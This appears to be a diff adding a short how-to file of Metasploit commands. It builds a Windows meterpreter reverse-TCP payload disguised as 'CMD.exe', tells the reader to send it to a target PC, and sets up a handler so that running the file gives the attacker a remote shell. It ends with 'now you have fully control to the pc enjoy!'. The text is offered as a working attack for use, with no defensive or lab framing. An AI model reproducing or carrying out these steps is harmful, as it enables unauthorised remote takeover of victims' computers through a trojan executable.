@@ -1,0 +1,17 @@
+@open two terminal
+@on first terminal
+/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.11.190 -f exe -o /home/kalifa/Desktop/CMD.exe  
+@send the CMD.exe to target windows pc
+
+@on second terminal
+service postgresql start
+service metasploit start
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+show options
+set LHOST 192.168.11.190
+exploit
+@wait for the target to press the cmd.exe
+shell
+@now you have fully control to the pc enjoy!
